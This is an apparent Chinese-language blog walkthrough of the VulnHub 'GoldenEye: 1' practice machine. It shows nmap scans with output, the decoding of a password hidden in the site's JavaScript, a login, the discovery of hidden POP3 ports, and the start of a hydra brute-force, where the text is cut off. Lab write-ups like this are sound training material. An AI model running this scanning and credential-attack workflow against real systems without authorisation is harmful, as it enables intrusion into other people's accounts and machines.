<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>001-Goldeneye | O X O X</title><meta name="keywords" content="百项目,dansemal"><meta name="author" content="Dansemal,dansemalrayo@gmail.com"><meta name="copyright" content="Dansemal"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="项目Goldeneye 12345678项目地址:https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;goldeneye-1,240&#x2F;Name: GoldenEye: 1Date release: 4 May 2018Author: creosoteSeries: GoldenEye 12345678DescriptionI recently got done creating an OS"><meta property="og:type" content="article"><meta property="og:title" content="001-Goldeneye"><meta property="og:url" content="https://www.dansemal.cn/posts/243a10bf/"><meta property="og:site_name" content="O X O X"><meta property="og:description" content="项目Goldeneye 12345678项目地址:https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;goldeneye-1,240&#x2F;Name: GoldenEye: 1Date release: 4 May 2018Author: creosoteSeries: GoldenEye 12345678DescriptionI recently got done creating an OS"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661152927-3bb06394a5ddb52b5c35defb01ff116e.webp"><meta property="article:published_time" content="2022-08-14T07:21:00.000Z"><meta property="article:modified_time" content="2022-08-14T06:19:20.000Z"><meta property="article:author" content="Dansemal"><meta property="article:tag" content="百项目"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661152927-3bb06394a5ddb52b5c35defb01ff116e.webp"><link rel="shortcut icon" href="/image/favicon.ico"><link rel="canonical" href="https://www.dansemal.cn/posts/243a10bf/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="0WBLAV64xzXAwZhQdLLsIMW5oWDt4mwXgn_sNzvuiW8"><meta name="google-site-verification" content="google38361e9ab8a8ecc6"><meta name="bing_site_verification" content="36C520D228E5759AB2C785B4FED978FE"><meta name="baidu-site-verification" content="code-TRavNImLly"><meta name="360-site-verification" content="6732d3fff4d5eb4328b640d2629cc9ec"><meta name="yandex-verification" content="7216ab54ecfd242b"><meta name="shenma-site-verification" content="6481d422261272d2a919fdf730fe771b_1622811318"><link rel="manifest" href="/js/pwa/manifest.json"><meta name="msapplication-TileColor" content="#fff"><link rel="apple-touch-icon" sizes="180x180" href="/js/pwa/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/js/pwa/32.png"><link rel="icon" type="image/png" sizes="16x16" href="/js/pwa/16.png"><link rel="mask-icon" href="/js/pwa/safari-pinned-tab.svg" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/css/all.min.css" media="print" onload='this.media="all"'><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle=window.adsbygoogle||[]).push({google_ad_client:"ca-pub-5809522043388135",enable_page_level_ads:"true"})</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?cb4c501d9775204b6d7e64824cb40e4b";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-179559972-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-179559972-1")</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:{defaultEncoding:1,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"简"},noticeOutdate:{limitDay:30,position:"top",messagePrev:"距离上次更新已经过了",messageNext:"天，文章所描述的內容可能已经发生变化，请留意。"},highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"天",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"mediumZoom",Snackbar:void 0,source:{jQuery:"/js/jquery.min.js",justifiedGallery:{js:"/js/jquery.justifiedGallery.min.js",css:"/css/justifiedGallery.min.css"},fancybox:{js:"/js/fancybox.min.js",css:"/css/fancybox.min.css"}},isPhotoFigcaption:!1,islazyload:!1,isanchor:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"001-Goldeneye",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2022-08-14 14:19:20"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")},saveToLocal.get("theme"),activateDarkMode();const t=saveToLocal.get("aside-status");void 0!==t&&("hide"===t?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const o=saveToLocal.get("global-font-size");void 0!==o&&document.documentElement.style.setProperty("--global-font-size",o+"px")})(window)</script><style>.card-announcement .social-button{margin:.6rem 0 0 0;text-align:center}.card-announcement .social-button a{display:block;margin:.2rem 0;background-color:var(--btn-bg);color:var(--btn-color);line-height:1.6rem;transition:all .3s;position:relative;z-index:1}</style><link rel="stylesheet" href="/css/solar.min.css"><link rel="stylesheet" href="/css/stars.min.css"><script defer src="/js/settings.min.js"></script><link rel="stylesheet" href="/css/iconfont.min.css"><style>.app-refresh{position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease}.app-refresh-wrap{display:flex;color:#fff;height:100%;align-items:center;justify-content:center}.app-refresh-wrap a{color:#fff;text-decoration:underline;cursor:pointer}</style><link rel="stylesheet" href="/css/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="/css/heartbeat.min.css"><link rel="stylesheet" href="/css/function.min.css"><link rel="alternate" href="/atom.xml" title="O X O X" type="application/atom+xml"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/image/avatar.webp" onerror='onerror=null,src="/image/friend_404.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-compass"></i> <span>目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/talking/"><i class="fa-fw fas fa-cubes"></i> <span>说说</span></a></div><div class="menus_item"><a class="site-page" href="/bb/"><i class="fa-fw fas fa-cubes"></i> <span>自言自语</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i> <span>留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youqinglianjie"></i> <span>友情链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661152927-3bb06394a5ddb52b5c35defb01ff116e.webp)"><nav id="nav"><div id="he-plugin-simple"></div><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-compass"></i> <span>目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/talking/"><i class="fa-fw fas fa-cubes"></i> <span>说说</span></a></div><div class="menus_item"><a class="site-page" href="/bb/"><i class="fa-fw fas fa-cubes"></i> <span>自言自语</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i> <span>留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youqinglianjie"></i> <span>友情链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">001-Goldeneye</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-14T07:21:00.000Z" title="发表于 2022-08-14 15:21:00">2022-08-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-14T06:19:20.000Z" title="更新于 2022-08-14 14:19:20">2022-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%99%BE%E9%A1%B9%E7%9B%AE/">百项目</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/243a10bf/#post-comment"><span class="waline-comment-count" data-path="/posts/243a10bf/"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="项目Goldeneye">项目Goldeneye</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">项目地址:https://www.vulnhub.com/entry/goldeneye-1,240/</span><br><span class="line"></span><br><span class="line">Name: GoldenEye: 1</span><br><span class="line">Date release: 4 May 2018</span><br><span class="line">Author: creosote</span><br><span class="line">Series: GoldenEye</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line"></span><br><span class="line">I recently got done creating an OSCP type vulnerable machine that&#x27;s themed after the great James Bond film (and even better n64 game) GoldenEye. The goal is to get root and capture the secret GoldenEye codes - flag.txt.</span><br><span class="line"></span><br><span class="line">I&#x27;d rate it as Intermediate, it has a good variety of techniques needed to get root - no exploit development/buffer overflows. After completing the OSCP I think this would be a great one to practice on, plus there&#x27;s a hint of CTF flavor.</span><br><span class="line"></span><br><span class="line">I&#x27;ve created and validated on VMware and VirtualBox. You won&#x27;t need any extra tools other than what&#x27;s on Kali by default. Will need to be setup as Host-Only, and on VMware you may need to click &quot;retry&quot; if prompted, upon initially starting it up because of formatting.</span><br><span class="line">## Changelog Beta - 2018-05-02 v1 - 2018-05-04 </span><br></pre></td></tr></table></figure><h2 id="信息搜集">信息搜集</h2><h3 id="获取项目地址">获取项目地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.0.0.0/24</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sP 10.0.0.0/24</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 09:58 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> OpenWrt.lan (10.0.0.1)</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line">MAC Address: 00:15:5D:64:C0:01 (Microsoft)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> PC-A.lan (10.0.0.2)</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">MAC Address: 00:15:5D:64:C0:00 (Microsoft)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ubuntu.lan (10.0.0.101)</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">MAC Address: 00:0C:29:75:99:20 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> kali.lan (10.0.0.3)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.07 seconds</span><br></pre></td></tr></table></figure><p>确定项目ip为 <mark class="hl-label default">10.0.0.101</mark></p><h3 id="扫描项目端口">扫描项目端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap 10.0.0.101</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 13:36 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 01.lan (10.0.0.101)</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">25/tcp open  smtp</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:75:99:20 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.33 seconds</span><br></pre></td></tr></table></figure><p>发现开放了80端口 25 smtp端口</p><p>目前信息</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.101</span><br><span class="line">port:25,80</span><br></pre></td></tr></table></figure><h3 id="访问80端口">访问80端口</h3><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1660887771-a500e9bd3ed3f434d984ad7681b8f237.webp" alt="image-20220819134248361"></p><p>得到信息 /sev-home/</p><p>访问此页面 有个弹窗 是个登录页面</p><p>接着查看主页面源代码 发现js文件有点奇怪</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">GoldenEyeText</span>: <span class="string">&quot;&lt;span&gt;&lt;br/&gt;Severnaya Auxiliary Control Station&lt;br/&gt;****TOP SECRET ACCESS****&lt;br/&gt;Accessing Server Identity&lt;br/&gt;Server Name:....................&lt;br/&gt;GOLDENEYE&lt;br/&gt;&lt;br/&gt;User: UNKNOWN&lt;br/&gt;&lt;span&gt;Naviagate to /sev-home/ to login&lt;/span&gt;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Boris, make sure you update your default password. </span></span><br><span class="line"><span class="comment">//My sources say MI6 maybe planning to infiltrate. </span></span><br><span class="line"><span class="comment">//Be on the lookout for any suspicious network traffic....</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//I encoded you p@ssword below...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//BTW Natalya says she can break your codes</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;typeing&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; allElements.<span class="property">length</span>; j++) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentElementId = allElements[j].<span class="property">id</span>;</span><br><span class="line">  <span class="keyword">var</span> currentElementIdContent = data[<span class="number">0</span>][currentElementId];</span><br><span class="line">  <span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(currentElementId);</span><br><span class="line">  <span class="keyword">var</span> devTypeText = currentElementIdContent;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>, isTag, text;</span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">type</span>(<span class="params"></span>) &#123;</span><br><span class="line">    text = devTypeText.<span class="title function_">slice</span>(<span class="number">0</span>, ++i);</span><br><span class="line">    <span class="keyword">if</span> (text === devTypeText) <span class="keyword">return</span>;</span><br><span class="line">    element.<span class="property">innerHTML</span> = text + <span class="string">`&lt;span class=&#x27;blinker&#x27;&gt;&amp;#32;&lt;/span&gt;`</span>;</span><br><span class="line">    <span class="keyword">var</span> char = text.<span class="title function_">slice</span>(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&lt;&quot;</span>) isTag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&gt;&quot;</span>) isTag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (isTag) <span class="keyword">return</span> <span class="title function_">type</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(type, <span class="number">60</span>);</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//鲍里斯，确保你更新了你的默认密码。 </span><br><span class="line">//我的消息来源说MI6可能计划渗透。 </span><br><span class="line">//留意任何可疑的网络流量......</span><br><span class="line">//</span><br><span class="line">//我在下面给你编码了 p@ssword...</span><br><span class="line">//</span><br><span class="line">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97; &amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><br><span class="line">//</span><br><span class="line">//顺便说一句，娜塔莉亚说她可以破解你的密码</span><br></pre></td></tr></table></figure><p>取出有用信息</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">已知信息</span><br><span class="line">ip:10.0.0.101</span><br><span class="line">port:25,80</span><br><span class="line">login:/sev-home/</span><br><span class="line">password:&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><br><span class="line">此password不难看出为html实体编码</span><br><span class="line">解码后得到:InvincibleHack3r</span><br><span class="line"></span><br><span class="line">password:InvincibleHack3r</span><br><span class="line">name1=Boris</span><br><span class="line">name2=Natalya</span><br></pre></td></tr></table></figure><p>尝试用name 和password 进行登入</p><p>最终 name=boris;password=InvincibleHack3r登陆成功</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1660894577-22f808b32394aa98d428669440228375.webp" alt="image-20220819153612606"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GoldenEye 是一个绝密的苏联东方武器项目。  由于您有权访问，因此您肯定持有绝密许可并有资格成为经过认证的 GoldenEye 网络运营商 (GNO)</span><br><span class="line"></span><br><span class="line"> 请向合格的 GNO 主管发送电子邮件，以接受在线 GoldenEye 操作员培训，成为 GoldenEye 系统的管理员</span><br><span class="line"></span><br><span class="line"> 请记住，由于默默无闻的安全性非常有效，我们已将 pop3 服务配置为在非常高的非默认端口上运行</span><br></pre></td></tr></table></figure><p>根据信息能得知还有隐藏的端口 为pop3服务</p><h3 id="扫描隐藏端口服务">扫描隐藏端口服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 10.0.0.101</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nmap -p- 10.0.0.101</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 15:37 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 01.lan (10.0.0.101)</span><br><span class="line">Host is up (0.00089s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">80/tcp    open  http</span><br><span class="line">55006/tcp open  unknown</span><br><span class="line">55007/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:75:99:20 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.15 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现 55006 55007端口 然后继续扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nmap -p55006,55007 10.0.0.101 -sS -sV -A -T5</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 15:39 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 01.lan (10.0.0.101)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">55006/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE PIPELINING UIDL USER SASL(PLAIN) CAPA RESP-CODES TOP</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">55007/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING UIDL SASL(PLAIN) STLS RESP-CODES AUTH-RESP-CODE CAPA USER TOP</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">MAC Address: 00:0C:29:75:99:20 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.06 ms 01.lan (10.0.0.101)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.25 seconds</span><br></pre></td></tr></table></figure><p>能确认55006 ssl/pop3 55007 pop3</p><p>那么接着使用九头蛇爆破pop3端口</p><h3 id="hydra-爆破pop3">hydra 爆破pop3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用上面 搜集的两个用户名进行爆破</span></span><br><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># cat 